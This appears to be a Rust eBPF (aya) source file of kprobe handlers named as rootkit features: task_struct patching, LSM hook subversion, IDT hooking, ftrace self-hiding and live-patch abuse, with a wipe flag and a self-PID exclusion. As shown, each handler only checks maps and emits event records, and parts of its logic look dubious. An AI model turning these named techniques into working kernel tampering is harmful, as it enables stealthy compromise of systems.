use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_ktime_get_ns},
    macros::{kprobe, kretprobe},
    programs::ProbeContext,
};
use common::{
    EventHeader, TaskPatchRecord, EVENT_FTRACE_SELF_HIDDEN, EVENT_IDT_HOOKED,
    EVENT_LIVEPATCH_ABUSED, EVENT_LSM_HOOK_SUBVERTED, EVENT_TASK_STRUCT_PATCHED,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 76: task_struct Patching
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_task_patch(ctx: ProbeContext) -> u32 {
    try_task_patch(&ctx).unwrap_or_default()
}

fn try_task_patch(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    if let Some(record) = unsafe { TASK_PATCH_TABLE.get(&pid) } {
        let task = unsafe { bpf_get_current_task() as *const u8 };
        if task.is_null() {
            return Ok(0);
        }

        let offset = record.field_offset as usize;
        let target_addr = unsafe { task.add(offset) as *mut u64 };
        let _ = unsafe { core::ptr::read_volatile(target_addr) };

        let event = EventHeader {
            event_type: EVENT_TASK_STRUCT_PATCHED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: record.field_offset as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 77: LSM Hook Subversion
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_lsm_override(ctx: ProbeContext) -> u32 {
    try_lsm_override(&ctx).unwrap_or_default()
}

fn try_lsm_override(_ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    if let Some(entry) = unsafe { LSM_OVERRIDE_TABLE.get(&pid) } {
        if entry.decision == 0 {
            let event = EventHeader {
                event_type: EVENT_LSM_HOOK_SUBVERTED,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: entry.hook_id as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 78: IDT Hooking via eBPF
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_idt_hook(ctx: ProbeContext) -> u32 {
    try_idt_hook(&ctx).unwrap_or_default()
}

fn try_idt_hook(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let idt_base: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    let vector_idx: u32 = (idt_base & 0xFF) as u32;
    if let Some(shadow) = unsafe { IDT_SHADOW.get(vector_idx) } {
        if *shadow != 0 && *shadow != idt_base {
            let event = EventHeader {
                event_type: EVENT_IDT_HOOKED,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: idt_base,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 79: ftrace/kprobe Self-Hiding
// ──────────────────────────────────────────────

#[kretprobe]
pub fn shadow_ftrace_hide(ctx: ProbeContext) -> u32 {
    try_ftrace_hide(&ctx).unwrap_or_default()
}

fn try_ftrace_hide(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let prog_id: u32 = unsafe { ctx.arg(0).unwrap_or(0) };

    if unsafe { HIDDEN_PROG_IDS.get(&prog_id) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_FTRACE_SELF_HIDDEN,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: prog_id as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 80: Kernel Live-Patching Abuse
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_livepatch(ctx: ProbeContext) -> u32 {
    try_livepatch(&ctx).unwrap_or_default()
}

fn try_livepatch(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let patch_addr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { LIVEPATCH_TARGETS.get(&patch_addr) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_LIVEPATCH_ABUSED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: patch_addr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
